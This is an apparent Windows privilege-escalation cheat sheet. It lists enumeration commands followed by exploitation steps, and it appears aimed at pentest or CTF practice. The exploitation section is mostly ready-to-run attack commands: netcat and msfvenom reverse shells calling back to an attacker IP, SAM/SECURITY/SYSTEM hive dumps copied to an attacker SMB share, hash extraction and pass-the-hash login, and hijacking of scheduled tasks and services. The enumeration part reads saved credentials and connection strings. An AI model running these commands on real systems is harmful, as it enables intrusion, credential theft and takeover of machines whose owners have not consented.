## Enumeration

### Get hostname of target machine

```nix
hostname
```

### Get system information

```nix
systeminfo
```

### View Windows updates and security patches

```nix
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### View installed programs and softwares

```nix
wmic product get name,version,vendor
```

### View current user's privileges

```nix
whoami /priv
```

### View current user's group membership

```nix
whoami /groups
```

### Get user's information

```nix
net user username
```

### Get all system users

```nix
net users
```

```nix
dir /b /ad "C:\\Users\\"
```

Windows XP and below

```nix
dir /b /ad "C:\\Documents and Settings\\"
```

### View other logged in users

```nix
qwinsta
```

### View status of active Windows services and drivers

```nix
sc query
```

### View a Windows service configuration

```nix
sc qc [APP NAME]
```

The associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter

### View environment variables

```powershell
Get-ChildItem Env: | ft Key,Value
```

### View terminal command history

```powershell
type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```

```powershell
cat (Get-PSReadlineOption).HistorySavePath
```

### Check for AlwaysInstallElevated privileges

Value of `0x1` means AlwaysInstallElevated is enabled

```powershell
REG QUERY HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
```

```powershell
REG QUERY HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
```

### Check for saved windows credentials

```powershell
cmdkey /list
```

### Check .NET Version

```nix
REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Net Framework Setup\\NDP"
```

### Check for IIS configuration

```nix
type C:\\inetpub\\wwwroot\\web.config | findstr connectionString
```

```nix
type C:\\Windows\\Microsoft.NET\\Framework64\\[VERSION]\\Config\\web.config | findstr connectionString
```

### Check for PuTTY credentials

```nix
REG QUERY HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s
```

### Check for scheduled tasks

```nix
schtasks /query /tn TASK_NAME /fo list /v
```

### Check scheduled tasks permissions

```nix
icacls C:\\Tasks\\schtask.bat
```

### Check for running tasks

```powershell
tasklist /svc
```

### Look for specific task

```powershell
tasklist /svc /i TASK_NAME
```

### Using automated scripts

- [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

## Exploitation

### Bypass PowerShell Execution Policy

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

### Abuse SeImpersonatePrivilege

Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to the target machine and run the following command. Only applicable in Windows 10 and Server 2016/2019.

```nix
PrintSpoofer.exe -i -c cmd
```

For older versions such as Windows 2000/XP/Vista and Server 2003/2008. Download [Churrasco](https://github.com/Re4son/Churrasco) to target machine and run the following command.

```nix
churrasco.exe "nc.exe 10.10.10.10 5555 -e cmd"
```

### Abuse AlwaysInstallElevated privilege

Generate reverse shell using `msfvenom`. Host the reverse shell and download it from the target machine

```nix
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 lport=4444 -f 
```

```nix
msi -o reverse.msi
```

Execute the reverse shell by installing the malicious installer package. A netcat listener must be active on the attack machine.

```nix
msiexec /quiet /qn /i C:\\Windows\\Temp\\reverse.msi
```

### Abuse ****SeBackup / SeRestore to**** dump SAM, SECURITY, and SYSTEM hashes

Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your machine

```nix
REG SAVE HKLM\\SAM C:\\Temp\\sam.save
```

```nix
REG SAVE HKLM\\SECURITY C:\\Temp\\security.save
```

```nix
REG SAVE HKLM\\SYSTEM C:\\Temp\\system.save
```

Run a SMBServer and transfer files back to your machine

```nix
# Make sure you run `mkdir share` if the folder doesn't exists
impacket-smbserver -smb2support -username username -password password public share
```

Transfer copy of the SYSTEM, SECURITY and SAM hives to your machine

```nix
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\sam.save \\\\10.10.10.10\\public
```

```nix
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\security.save \\\\10.10.10.10\\public
```

```nix
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\system.save \\\\10.10.10.10\\public
```

Retrieve user password hashes

```nix
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Login as the new elevated user

```nix
impacket-psexec -hashes [HASH] username@10.10.10.10
```

### Abuse SeTakeOwnership

```nix
takeown /f C:\\inetpub\\wwwwroot\\web.config
```

```nix
icacls C:\\inetpub\\wwwwroot\\web.config /grant attacker:F
```

### Abuse saved Windows credentials

```nix
runas /savecred /user:[USERNAME] cmd.exe
```

### Abuse scheduled tasks write permissions

```nix
echo C:\\Tools\\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\\Tasks\\schtask.bat
```

```nix
# Force run the scheduled task
schtasks /run /tn [TASK NAME]
```

### Abuse insecure permission on Windows service executable

```nix
C:\\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\PROGRA~2\\SYSTEM~1\\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcuser1
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\\Progra~2\\System~1\\WService.exe`. We then proceed to check the permissions on the executable:

```nix
C:\\Users\\thm-unpriv>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe
C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\\SYSTEM:(I)(F)
                                  BUILTIN\\Administrators:(I)(F)
                                  BUILTIN\\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.

```nix
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

### Abuse unquoted service paths

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

```nix
C:\\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcusr2
```

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be `C:\\\\MyPrograms\\\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

1. First, search for `C:\\\\MyPrograms\\\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\\\MyPrograms\\\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.

```nix
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

```nix
C:\\> move C:\\Temp\\rev-svc.exe C:\\MyPrograms\\Disk.exe

C:\\> icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

```nix
C:\\> sc stop "disk sorter enterprise"
C:\\> sc start "disk sorter enterprise"
```

## Other Resources

- [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology) and Resources/Windows - Privilege Escalation.md